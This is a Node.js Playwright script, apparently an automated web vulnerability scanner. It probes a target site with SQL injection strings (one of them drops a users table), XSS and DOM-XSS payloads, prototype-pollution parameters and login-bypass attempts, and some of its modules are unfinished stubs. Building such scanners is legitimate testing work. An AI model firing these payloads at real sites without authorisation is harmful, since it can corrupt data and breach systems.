#!/usr/bin/env node

const { chromium } = require('playwright');
const crypto = require('crypto');
const fs = require('fs');
const path = require('path');

class SinkLevelValidator {
    constructor(target, options = {}) {
        this.target = target;
        this.options = {
            headless: options.headless !== false,
            timeout: options.timeout || 30000,
            browserContext: options.browserContext || null,
            ...options
        };
        
        this.browser = null;
        this.context = null;
        this.sinkTraces = [];
        this.executionEvidence = [];
        this.sessionId = crypto.randomBytes(16).toString('hex');
    }

    async initialize() {
        console.log('🚀 Initializing Sink-Level Validator...');
        
        this.browser = await chromium.launch({
            headless: this.options.headless,
            args: [
                '--no-sandbox',
                '--disable-setuid-sandbox',
                '--disable-dev-shm-usage'
            ]
        });
        
        this.context = await this.browser.newContext({
            viewport: { width: 1920, height: 1080 },
            userAgent: 'SinkLevelValidator/1.0 - Authorized Security Testing',
            ignoreHTTPSErrors: true
        });
        
        console.log('✅ Sink-Level Validator initialized');
    }

    async performSinkLevelAudit() {
        console.log(`🔥 SINK-LEVEL AUDIT: ${this.target}`);
        console.log(`📋 Session ID: ${this.sessionId}`);
        console.log('=' .repeat(80));
        
        try {
            // Phase 1: Browser-based reconnaissance
            const recon = await this.performBrowserReconnaissance();
            
            // Phase 2: Sink-level vulnerability testing
            const sinkTests = await this.performSinkLevelTesting();
            
            // Phase 3: Execution confirmation
            const executionEvidence = await this.confirmExecution();
            
            // Phase 4: Stateful attack chains
            const statefulChains = await this.testStatefulChains();
            
            const report = this.generateSinkLevelReport({
                recon,
                sinkTests,
                executionEvidence,
                statefulChains
            });
            
            console.log('\n' + '='.repeat(80));
            console.log('✅ SINK-LEVEL AUDIT COMPLETED');
            console.log('='.repeat(80));
            
            return report;
            
        } catch (error) {
            console.error('❌ Sink-level audit failed:', error.message);
            throw error;
        }
    }

    async performBrowserReconnaissance() {
        console.log('\n🔍 PHASE 1: BROWSER-BASED RECONNAISSANCE');
        
        const recon = {
            javascriptExecution: false,
            domAnalysis: {},
            eventHandlers: [],
            formEndpoints: [],
            apiEndpoints: [],
            cookies: [],
            localStorage: {},
            sessionStorage: {}
        };
        
        try {
            const page = await this.context.newPage();
            await page.goto(`https://${this.target}`, {
                waitUntil: 'networkidle',
                timeout: this.options.timeout
            });
            
            // Test JavaScript execution
            const jsResult = await page.evaluate(() => {
                return {
                    jsEnabled: true,
                    domContentLoaded: document.readyState === 'complete',
                    hasEventListeners: document.querySelectorAll('*').length > 0,
                    timestamp: Date.now()
                };
            });
            recon.javascriptExecution = jsResult;
            
            // DOM analysis
            const domAnalysis = await page.evaluate(() => {
                const forms = Array.from(document.forms).map(form => ({
                    action: form.action,
                    method: form.method,
                    inputs: Array.from(form.elements).map(input => ({
                        name: input.name,
                        type: input.type,
                        value: input.value
                    }))
                }));
                
                const scripts = Array.from(document.scripts).map(script => ({
                    src: script.src,
                    type: script.type,
                    async: script.async,
                    defer: script.defer
                }));
                
                const links = Array.from(document.links).map(link => ({
                    href: link.href,
                    target: link.target
                }));
                
                return {
                    forms,
                    scripts,
                    links,
                    totalElements: document.querySelectorAll('*').length
                };
            });
            recon.domAnalysis = domAnalysis;
            
            // Event handler analysis
            const eventHandlers = await page.evaluate(() => {
                const handlers = [];
                const elements = document.querySelectorAll('*');
                
                elements.forEach(element => {
                    const events = [];
                    for (const event of ['click', 'submit', 'change', 'input', 'focus', 'blur']) {
                        if (element[`on${event}`]) {
                            events.push(event);
                        }
                    }
                    if (events.length > 0) {
                        handlers.push({
                            element: element.tagName,
                            id: element.id,
                            class: element.className,
                            events
                        });
                    }
                });
                
                return handlers;
            });
            recon.eventHandlers = eventHandlers;
            
            // Form endpoints
            recon.formEndpoints = domAnalysis.forms.map(form => form.action);
            
            // API endpoints (from scripts)
            const apiEndpoints = await page.evaluate(() => {
                const endpoints = new Set();
                
                // Look for fetch calls in inline scripts
                const scripts = document.querySelectorAll('script:not([src])');
                scripts.forEach(script => {
                    const content = script.textContent;
                    const fetchMatches = content.match(/fetch\s*\(\s*['"`]([^'"`]+)['"`]/g);
                    if (fetchMatches) {
                        fetchMatches.forEach(match => {
                            const url = match.match(/['"`]([^'"`]+)['"`]/)[1];
                            endpoints.add(url);
                        });
                    }
                });
                
                return Array.from(endpoints);
            });
            recon.apiEndpoints = apiEndpoints;
            
            // Cookies
            recon.cookies = await this.context.cookies();
            
            // Storage analysis
            const storage = await page.evaluate(() => {
                const localStorageData = {};
                const sessionStorageData = {};
                
                for (let i = 0; i < localStorage.length; i++) {
                    const key = localStorage.key(i);
                    localStorageData[key] = localStorage.getItem(key);
                }
                
                for (let i = 0; i < sessionStorage.length; i++) {
                    const key = sessionStorage.key(i);
                    sessionStorageData[key] = sessionStorage.getItem(key);
                }
                
                return {
                    localStorage: localStorageData,
                    sessionStorage: sessionStorageData
                };
            });
            recon.localStorage = storage.localStorage;
            recon.sessionStorage = storage.sessionStorage;
            
            await page.close();
            
            console.log(`   ✅ JavaScript execution: ${recon.javascriptExecution.jsEnabled}`);
            console.log(`   ✅ Forms found: ${recon.domAnalysis.forms.length}`);
            console.log(`   ✅ Scripts found: ${recon.domAnalysis.scripts.length}`);
            console.log(`   ✅ Event handlers: ${recon.eventHandlers.length}`);
            console.log(`   ✅ API endpoints: ${recon.apiEndpoints.length}`);
            console.log(`   ✅ Cookies: ${recon.cookies.length}`);
            
            return recon;
            
        } catch (error) {
            console.log(`   ❌ Browser reconnaissance failed: ${error.message}`);
            return recon;
        }
    }

    async performSinkLevelTesting() {
        console.log('\n🚨 PHASE 2: SINK-LEVEL VULNERABILITY TESTING');
        
        const sinkTests = {
            sqlInjection: await this.testSQLInjectionSink(),
            xss: await this.testXSSSink(),
            domXss: await this.testDOMXSSSink(),
            prototypePollution: await this.testPrototypePollutionSink(),
            csrf: await this.testCSRFSink()
        };
        
        return sinkTests;
    }

    async testSQLInjectionSink() {
        console.log('   🔍 Testing SQL Injection Sink...');
        
        const results = [];
        const page = await this.context.newPage();
        
        try {
            await page.goto(`https://${this.target}`, {
                waitUntil: 'networkidle',
                timeout: this.options.timeout
            });
            
            // Find input fields and forms
            const inputs = await page.evaluate(() => {
                const allInputs = [];
                const inputsWithNames = document.querySelectorAll('input[name], textarea[name], select[name]');
                
                inputsWithNames.forEach(input => {
                    allInputs.push({
                        name: input.name,
                        type: input.type,
                        value: input.value,
                        form: input.form ? input.form.action : null
                    });
                });
                
                return allInputs;
            });
            
            const sqlPayloads = [
                "' OR '1'='1",
                "' UNION SELECT NULL--",
                "'; DROP TABLE users--",
                "' AND 1=CONVERT(int, (SELECT @@version))--"
            ];
            
            for (const input of inputs.slice(0, 3)) { // Test first 3 inputs
                for (const payload of sqlPayloads) {
                    const traceId = crypto.randomBytes(8).toString('hex');
                    
                    try {
                        // Monitor network requests for SQL errors
                        const sqlErrors = [];
                        page.on('response', async (response) => {
                            try {
                                const body = await response.text();
                                if (this.containsSQLErrors(body)) {
                                    sqlErrors.push({
                                        url: response.url(),
                                        status: response.status(),
                                        error: this.extractSQLPattern(body)
                                    });
                                }
                            } catch (e) {
                                // Ignore response parsing errors
                            }
                        });
                        
                        // Inject payload
                        await page.evaluate((inputName, payloadValue) => {
                            const element = document.querySelector(`[name="${inputName}"]`);
                            if (element) {
                                element.value = payloadValue;
                                element.dispatchEvent(new Event('input', { bubbles: true }));
                            }
                        }, input.name, payload);
                        
                        // Submit form if exists
                        if (input.form) {
                            const form = await page.$(`form[action="${input.form}"]`);
                            if (form) {
                                await form.evaluate(form => form.submit());
                                await page.waitForTimeout(2000);
                            }
                        }
                        
                        // Check for sink-level evidence
                        const sinkEvidence = await page.evaluate(() => {
                            return {
                                domContent: document.body.innerHTML.substring(0, 1000),
                                consoleErrors: window.consoleErrors || [],
                                networkErrors: window.networkErrors || []
                            };
                        });
                        
                        const result = {
                            traceId,
                            input: input.name,
                            payload,
                            sinkReached: sqlErrors.length > 0,
                            evidence: sqlErrors,
                            domEvidence: sinkEvidence.domContent,
                            classification: sqlErrors.length > 0 ? 'VULNERABLE' : 'NO_EVIDENCE',
                            confidence: sqlErrors.length > 0 ? 0.9 : 0
                        };
                        
                        results.push(result);
                        
                        if (sqlErrors.length > 0) {
                            console.log(`     🚨 SQL Injection sink reached (confidence: 0.9)`);
                        }
                        
                    } catch (error) {
                        console.log(`     ❌ SQL Injection sink test failed: ${error.message}`);
                    }
                }
            }
            
            await page.close();
            
        } catch (error) {
            console.log(`   ❌ SQL Injection sink testing failed: ${error.message}`);
        }
        
        return results;
    }

    async testXSSSink() {
        console.log('   🔍 Testing XSS Sink...');
        
        const results = [];
        const page = await this.context.newPage();
        
        try {
            await page.goto(`https://${this.target}`, {
                waitUntil: 'networkidle',
                timeout: this.options.timeout
            });
            
            const xssPayloads = [
                '<script>alert("XSS")</script>',
                '<img src=x onerror=alert("XSS")>',
                '<svg onload=alert("XSS")>',
                'javascript:alert("XSS")'
            ];
            
            // Find URL parameters and input fields
            const targets = await page.evaluate(() => {
                const urlParams = new URLSearchParams(window.location.search);
                const paramNames = Array.from(urlParams.keys());
                
                const inputFields = Array.from(document.querySelectorAll('input[name], textarea[name]'))
                    .map(input => input.name);
                
                return {
                    urlParams: paramNames,
                    inputFields
                };
            });
            
            for (const param of targets.urlParams.slice(0, 2)) {
                for (const payload of xssPayloads) {
                    const traceId = crypto.randomBytes(8).toString('hex');
                    
                    try {
                        // Setup XSS detection
                        let xssExecuted = false;
                        page.on('dialog', dialog => {
                            if (dialog.message().includes('XSS')) {
                                xssExecuted = true;
                            }
                            dialog.accept();
                        });
                        
                        // Navigate with XSS payload
                        const testUrl = new URL(`https://${this.target}`);
                        testUrl.searchParams.set(param, payload);
                        
                        await page.goto(testUrl.toString(), {
                            waitUntil: 'networkidle',
                            timeout: this.options.timeout
                        });
                        
                        await page.waitForTimeout(1000);
                        
                        // Check for sink-level evidence
                        const sinkEvidence = await page.evaluate(() => {
                            const body = document.body.innerHTML;
                            return {
                                payloadInDOM: body.includes('<script') || body.includes('onerror'),
                                scriptTags: document.querySelectorAll('script').length,
                                eventHandlers: document.querySelectorAll('[onclick], [onerror], [onload]').length
                            };
                        });
                        
                        const result = {
                            traceId,
                            parameter: param,
                            payload,
                            sinkReached: xssExecuted,
                            evidence: sinkEvidence,
                            classification: xssExecuted ? 'VULNERABLE' : 'NO_EVIDENCE',
                            confidence: xssExecuted ? 0.95 : 0
                        };
                        
                        results.push(result);
                        
                        if (xssExecuted) {
                            console.log(`     🚨 XSS sink reached (confidence: 0.95)`);
                        }
                        
                    } catch (error) {
                        console.log(`     ❌ XSS sink test failed: ${error.message}`);
                    }
                }
            }
            
            await page.close();
            
        } catch (error) {
            console.log(`   ❌ XSS sink testing failed: ${error.message}`);
        }
        
        return results;
    }

    async testDOMXSSSink() {
        console.log('   🔍 Testing DOM XSS Sink...');
        
        const results = [];
        const page = await this.context.newPage();
        
        try {
            await page.goto(`https://${this.target}`, {
                waitUntil: 'networkidle',
                timeout: this.options.timeout
            });
            
            // Test URL fragment-based XSS
            const domXSSPayloads = [
                '#<img src=x onerror=alert("DOMXSS")>',
                '#<script>alert("DOMXSS")</script>',
                '#javascript:alert("DOMXSS")'
            ];
            
            for (const payload of domXSSPayloads) {
                const traceId = crypto.randomBytes(8).toString('hex');
                
                try {
                    let domXSSExecuted = false;
                    page.on('dialog', dialog => {
                        if (dialog.message().includes('DOMXSS')) {
                            domXSSExecuted = true;
                        }
                        dialog.accept();
                    });
                    
                    // Navigate with fragment
                    await page.goto(`https://${this.target}${payload}`, {
                        waitUntil: 'networkidle',
                        timeout: this.options.timeout
                    });
                    
                    await page.waitForTimeout(1000);
                    
                    // Check for DOM sink execution
                    const sinkEvidence = await page.evaluate(() => {
                        const hash = window.location.hash;
                        const body = document.body.innerHTML;
                        
                        // Check if hash is reflected in DOM
                        const hashInDOM = body.includes(hash.substring(1));
                        
                        // Check for dangerous sinks
                        const dangerousSinks = [
                            'innerHTML',
                            'outerHTML',
                            'insertAdjacentHTML',
                            'document.write'
                        ];
                        
                        const scriptContent = Array.from(document.scripts)
                            .map(s => s.textContent)
                            .join('\n');
                        
                        const sinkUsage = dangerousSinks.filter(sink => 
                            scriptContent.includes(sink)
                        );
                        
                        return {
                            hashReflected: hashInDOM,
                            dangerousSinks: sinkUsage,
                            hashValue: hash
                        };
                    });
                    
                    const result = {
                        traceId,
                        payload,
                        sinkReached: domXSSExecuted,
                        evidence: sinkEvidence,
                        classification: domXSSExecuted ? 'VULNERABLE' : 'NO_EVIDENCE',
                        confidence: domXSSExecuted ? 0.9 : 0
                    };
                    
                    results.push(result);
                    
                    if (domXSSExecuted) {
                        console.log(`     🚨 DOM XSS sink reached (confidence: 0.9)`);
                    }
                    
                } catch (error) {
                    console.log(`     ❌ DOM XSS sink test failed: ${error.message}`);
                }
            }
            
            await page.close();
            
        } catch (error) {
            console.log(`   ❌ DOM XSS sink testing failed: ${error.message}`);
        }
        
        return results;
    }

    async testPrototypePollutionSink() {
        console.log('   🔍 Testing Prototype Pollution Sink...');
        
        const results = [];
        const page = await this.context.newPage();
        
        try {
            await page.goto(`https://${this.target}`, {
                waitUntil: 'networkidle',
                timeout: this.options.timeout
            });
            
            const pollutionPayloads = [
                '__proto__.polluted=true',
                'constructor.prototype.polluted=true',
                'proto[polluted]=true'
            ];
            
            for (const payload of pollutionPayloads) {
                const traceId = crypto.randomBytes(8).toString('hex');
                
                try {
                    // Check if pollution was successful
                    const pollutionCheck = await page.evaluate((payloadValue) => {
                        const originalPolluted = {}.polluted;
                        
                        // Try to pollute via URL
                        const testUrl = new URL(window.location.href);
                        testUrl.searchParams.set(payloadValue.split('=')[0], payloadValue.split('=')[1]);
                        
                        return {
                            originalPolluted,
                            payload: payloadValue,
                            testUrl: testUrl.toString()
                        };
                    }, payload);
                    
                    // Navigate with pollution payload
                    const testUrl = new URL(`https://${this.target}`);
                    testUrl.searchParams.set(payload.split('=')[0], payload.split('=')[1]);
                    
                    await page.goto(testUrl.toString(), {
                        waitUntil: 'networkidle',
                        timeout: this.options.timeout
                    });
                    
                    // Check for pollution effects
                    const pollutionEvidence = await page.evaluate(() => {
                        return {
                            objectPolluted: {}.polluted === true,
                            arrayPolluted: [].polluted === true,
                            functionPolluted: (function() {}).polluted === true
                        };
                    });
                    
                    const result = {
                        traceId,
                        payload,
                        sinkReached: pollutionEvidence.objectPolluted || pollutionEvidence.arrayPolluted,
                        evidence: pollutionEvidence,
                        classification: (pollutionEvidence.objectPolluted || pollutionEvidence.arrayPolluted) ? 'VULNERABLE' : 'NO_EVIDENCE',
                        confidence: (pollutionEvidence.objectPolluted || pollutionEvidence.arrayPolluted) ? 0.95 : 0
                    };
                    
                    results.push(result);
                    
                    if (result.sinkReached) {
                        console.log(`     🚨 Prototype pollution sink reached (confidence: 0.95)`);
                    }
                    
                } catch (error) {
                    console.log(`     ❌ Prototype pollution sink test failed: ${error.message}`);
                }
            }
            
            await page.close();
            
        } catch (error) {
            console.log(`   ❌ Prototype pollution sink testing failed: ${error.message}`);
        }
        
        return results;
    }

    async testCSRFSink() {
        console.log('   🔍 Testing CSRF Sink...');
        
        const results = [];
        const page = await this.context.newPage();
        
        try {
            await page.goto(`https://${this.target}`, {
                waitUntil: 'networkidle',
                timeout: this.options.timeout
            });
            
            // Check for CSRF tokens in forms
            const csrfAnalysis = await page.evaluate(() => {
                const forms = Array.from(document.forms);
                const csrfTokens = [];
                
                forms.forEach(form => {
                    const tokenInputs = form.querySelectorAll('input[type="hidden"]');
                    tokenInputs.forEach(input => {
                        if (input.name.toLowerCase().includes('csrf') || 
                            input.name.toLowerCase().includes('token') ||
                            input.name.toLowerCase().includes('_token')) {
                            csrfTokens.push({
                                form: form.action,
                                tokenName: input.name,
                                tokenValue: input.value
                            });
                        }
                    });
                });
                
                return {
                    totalForms: forms.length,
                    formsWithCSRF: csrfTokens.length,
                    csrfTokens
                };
            });
            
            const result = {
                traceId: crypto.randomBytes(8).toString('hex'),
                evidence: csrfAnalysis,
                classification: csrfAnalysis.formsWithCSRF === csrfAnalysis.totalForms ? 'PROTECTED' : 'NO_EVIDENCE',
                confidence: csrfAnalysis.formsWithCSRF === csrfAnalysis.totalForms ? 0.9 : 0.5
            };
            
            results.push(result);
            
            console.log(`   ✅ CSRF analysis: ${csrfAnalysis.formsWithCSRF}/${csrfAnalysis.totalForms} forms protected`);
            
            await page.close();
            
        } catch (error) {
            console.log(`   ❌ CSRF sink testing failed: ${error.message}`);
        }
        
        return results;
    }

    async confirmExecution() {
        console.log('\n🔬 PHASE 3: EXECUTION CONFIRMATION');
        
        const executionEvidence = {
            javascriptExecution: false,
            networkActivity: [],
            domManipulation: [],
            eventTriggering: []
        };
        
        try {
            const page = await this.context.newPage();
            
            // Monitor JavaScript execution
            const jsErrors = [];
            page.on('pageerror', error => {
                jsErrors.push({
                    message: error.message,
                    stack: error.stack
                });
            });
            
            // Monitor network activity
            const networkRequests = [];
            page.on('request', request => {
                networkRequests.push({
                    url: request.url(),
                    method: request.method(),
                    headers: request.headers(),
                    timestamp: Date.now()
                });
            });
            
            page.on('response', response => {
                networkRequests.push({
                    url: response.url(),
                    status: response.status(),
                    headers: response.headers(),
                    timestamp: Date.now()
                });
            });
            
            await page.goto(`https://${this.target}`, {
                waitUntil: 'networkidle',
                timeout: this.options.timeout
            });
            
            // Test JavaScript execution
            const jsTest = await page.evaluate(() => {
                window.testExecution = true;
                return {
                    jsEnabled: true,
                    testExecution: window.testExecution,
                    timestamp: Date.now()
                };
            });
            executionEvidence.javascriptExecution = jsTest.jsEnabled;
            
            executionEvidence.networkActivity = networkRequests;
            executionEvidence.javascriptErrors = jsErrors;
            
            // Test DOM manipulation
            const domManipulation = await page.evaluate(() => {
                const originalTitle = document.title;
                document.title = 'TEST_EXECUTION';
                const titleChanged = document.title === 'TEST_EXECUTION';
                document.title = originalTitle;
                
                return {
                    titleChanged,
                    domAccessible: true
                };
            });
            executionEvidence.domManipulation.push(domManipulation);
            
            // Test event triggering
            const eventTriggering = await page.evaluate(() => {
                let eventFired = false;
                const testElement = document.createElement('div');
                testElement.addEventListener('click', () => {
                    eventFired = true;
                });
                testElement.click();
                
                return {
                    eventFired,
                    eventSystemFunctional: true
                };
            });
            executionEvidence.eventTriggering.push(eventTriggering);
            
            await page.close();
            
            console.log(`   ✅ JavaScript execution: ${executionEvidence.javascriptExecution}`);
            console.log(`   ✅ Network requests: ${executionEvidence.networkActivity.length}`);
            console.log(`   ✅ DOM manipulation: ${executionEvidence.domManipulation.length}`);
            console.log(`   ✅ Event triggering: ${executionEvidence.eventTriggering.length}`);
            
        } catch (error) {
            console.log(`   ❌ Execution confirmation failed: ${error.message}`);
        }
        
        return executionEvidence;
    }

    async testStatefulChains() {
        console.log('\n🔗 PHASE 4: STATEFUL ATTACK CHAINS');
        
        const statefulChains = {
            authenticationBypass: await this.testAuthenticationBypass(),
            privilegeEscalation: await this.testPrivilegeEscalation(),
            sessionHijacking: await this.testSessionHijacking()
        };
        
        return statefulChains;
    }

    async testAuthenticationBypass() {
        console.log('   🔍 Testing Authentication Bypass Chain...');
        
        const results = [];
        const page = await this.context.newPage();
        
        try {
            // Test common authentication bypass patterns
            const bypassAttempts = [
                { name: 'SQL Injection Login', payload: "' OR '1'='1'--" },
                { name: 'NoSQL Injection', payload: '{"$ne":null}' },
                { name: 'Header Bypass', headers: { 'X-Original-URL': '/admin' } }
            ];
            
            for (const attempt of bypassAttempts) {
                const traceId = crypto.randomBytes(8).toString('hex');
                
                try {
                    // Find login forms
                    const loginForms = await page.evaluate(() => {
                        return Array.from(document.forms).filter(form => {
                            const hasPassword = form.querySelector('input[type="password"]');
                            const hasUsername = form.querySelector('input[type="text"], input[type="email"]');
                            return hasPassword && hasUsername;
                        }).map(form => form.action);
                    });
                    
                    if (loginForms.length > 0) {
                        // Attempt bypass
                        if (attempt.headers) {
                            await page.setExtraHTTPHeaders(attempt.headers);
                        }
                        
                        await page.goto(`https://${this.target}`, {
                            waitUntil: 'networkidle',
                            timeout: this.options.timeout
                        });
                        
                        // Check if bypass was successful
                        const bypassEvidence = await page.evaluate(() => {
                            return {
                                authenticated: document.body.innerHTML.includes('logout') || 
                                             document.body.innerHTML.includes('profile'),
                                adminAccess: document.body.innerHTML.includes('admin'),
                                redirected: window.location.href.includes('dashboard')
                            };
                        });
                        
                        const result = {
                            traceId,
                            attempt: attempt.name,
                            sinkReached: bypassEvidence.authenticated || bypassEvidence.adminAccess,
                            evidence: bypassEvidence,
                            classification: bypassEvidence.authenticated ? 'VULNERABLE' : 'NO_EVIDENCE',
                            confidence: bypassEvidence.authenticated ? 0.8 : 0
                        };
                        
                        results.push(result);
                        
                        if (result.sinkReached) {
                            console.log(`     🚨 Authentication bypass sink reached (confidence: 0.8)`);
                        }
                    }
                    
                } catch (error) {
                    console.log(`     ❌ Authentication bypass test failed: ${error.message}`);
                }
            }
            
            await page.close();
            
        } catch (error) {
            console.log(`   ❌ Authentication bypass chain testing failed: ${error.message}`);
        }
        
        return results;
    }

    async testPrivilegeEscalation() {
        console.log('   🔍 Testing Privilege Escalation Chain...');
        
        const results = [];
        
        // This would require authenticated session - placeholder for implementation
        const result = {
            traceId: crypto.randomBytes(8).toString('hex'),
            attempt: 'Privilege Escalation',
            sinkReached: false,
            evidence: { requiresAuthentication: true },
            classification: 'REQUIRES_AUTH',
            confidence: 0
        };
        
        results.push(result);
        
        return results;
    }

    async testSessionHijacking() {
        console.log('   🔍 Testing Session Hijacking Chain...');
        
        const results = [];
        
        // This would require session analysis - placeholder for implementation
        const result = {
            traceId: crypto.randomBytes(8).toString('hex'),
            attempt: 'Session Hijacking',
            sinkReached: false,
            evidence: { requiresSession: true },
            classification: 'REQUIRES_SESSION',
            confidence: 0
        };
        
        results.push(result);
        
        return results;
    }

    containsSQLErrors(responseBody) {
        const sqlErrors = [
            /SQL syntax.*MySQL/i,
            /Warning.*mysql_/i,
            /valid PostgreSQL result/i,
            /ORA-\d{5}/i,
            /Microsoft OLE DB Provider/i
        ];
        return sqlErrors.some(pattern => pattern.test(responseBody));
    }

    extractSQLPattern(responseBody) {
        const patterns = {
            mysql: /SQL syntax.*MySQL/gi,
            postgresql: /valid PostgreSQL result/gi,
            oracle: /ORA-\d{5}/g
        };
        
        for (const [db, pattern] of Object.entries(patterns)) {
            if (pattern.test(responseBody)) {
                return { database: db, match: responseBody.match(pattern)[0] };
            }
        }
        return null;
    }

    generateSinkLevelReport(data) {
        const endTime = Date.now();
        
        const report = {
            metadata: {
                sessionId: this.sessionId,
                target: this.target,
                startTime: new Date().toISOString(),
                endTime: new Date(endTime).toISOString(),
                duration: endTime - this.startTime,
                engine: 'SinkLevelValidator v1.0',
                validationLayer: 'SINK_LEVEL_EXECUTION',
                reproducible: true
            },
            reconnaissance: data.recon,
            sinkTests: data.sinkTests,
            executionEvidence: data.executionEvidence,
            statefulChains: data.statefulChains,
            summary: {
                totalSinkTests: this.countSinkTests(data.sinkTests),
                vulnerabilitiesFound: this.countVulnerabilities(data.sinkTests),
                executionConfirmed: data.executionEvidence.javascriptExecution,
                classification: this.classifyOverallResults(data)
            }
        };
        
        this.saveReport(report);
        
        return report;
    }

    countSinkTests(sinkTests) {
        let count = 0;
        for (const [testType, results] of Object.entries(sinkTests)) {
            count += Array.isArray(results) ? results.length : 1;
        }
        return count;
    }

    countVulnerabilities(sinkTests) {
        let count = 0;
        for (const [testType, results] of Object.entries(sinkTests)) {
            if (Array.isArray(results)) {
                count += results.filter(r => r.classification === 'VULNERABLE').length;
            }
        }
        return count;
    }

    classifyOverallResults(data) {
        const vulnerabilities = this.countVulnerabilities(data.sinkTests);
        const totalTests = this.countSinkTests(data.sinkTests);
        
        if (vulnerabilities > 0) {
            return 'VULNERABLE';
        } else if (totalTests > 0) {
            return 'NO_EVIDENCE'; // Changed from SAFE to NO_EVIDENCE
        } else {
            return 'INSUFFICIENT_DATA';
        }
    }

    saveReport(report) {
        const filename = `sink_level_audit_${this.target}_${report.metadata.sessionId}.json`;
        const filepath = path.join(process.cwd(), 'reports', filename);
        
        const reportsDir = path.dirname(filepath);
        if (!fs.existsSync(reportsDir)) {
            fs.mkdirSync(reportsDir, { recursive: true });
        }
        
        fs.writeFileSync(filepath, JSON.stringify(report, null, 2));
        console.log(`📄 Sink-level audit report saved: ${filepath}`);
    }

    async destroy() {
        console.log('🔧 Shutting down Sink-Level Validator...');
        
        if (this.context) {
            await this.context.close();
        }
        
        if (this.browser) {
            await this.browser.close();
        }
        
        console.log('✅ Sink-Level Validator destroyed');
    }
}

module.exports = SinkLevelValidator;
